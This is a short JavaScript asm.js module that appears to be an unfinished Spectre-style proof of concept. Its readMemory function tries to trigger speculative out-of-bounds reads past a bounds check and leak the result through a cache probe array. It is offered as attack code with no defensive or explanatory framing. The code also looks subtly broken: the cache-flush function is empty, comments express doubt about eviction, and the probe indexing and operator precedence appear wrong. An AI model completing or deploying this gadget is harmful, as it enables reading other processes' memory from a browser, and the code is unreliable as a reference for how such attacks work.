export default function AsmModule(stdlib, foreign, heap) {
    "use asm";
    var length_array = new stdlib.Uint8Array(heap);
    var access_array = new stdlib.Uint8Array(heap);
    var probe_array = new stdlib.Uint8Array(heap);
    var temp = 0;
    var page_shift = foreign.page_shift | 0;
    var access_offset = foreign.access_offset | 0;
    var length_offset = foreign.length_offset | 0;
    var raw_probe_length = 0;
    
    function readMemory(index) {
        // length of the probe array should have been evicted from cache before
        // load the length of the probe array so speculative execution gets triggered
        // does flush not remove it from cache?
        // var length = foreign.length | 0;
        index = index | 0;
        var spread_index = 0;
        var length = 0;
        spread_index = index << page_shift | 0;
        raw_probe_length = (access_offset >> page_shift) | 0;
        // request from access_array's range (from RAM)
        length = length_array[((spread_index | 0) + (length_offset | 0)) | 0] + raw_probe_length | 0;
        if ((index | 0) < (length | 0)) {
            // load probe_array value into cache
            spread_index = access_array[spread_index | 0 + access_offset | 0] << page_shift | 0;
            temp = temp ^ probe_array[index | 0] | 0;
        }
        temp = temp * 2 | 0;
    }
    function flushCache() {
        
    }

    return {
        readMemory: readMemory
    };
};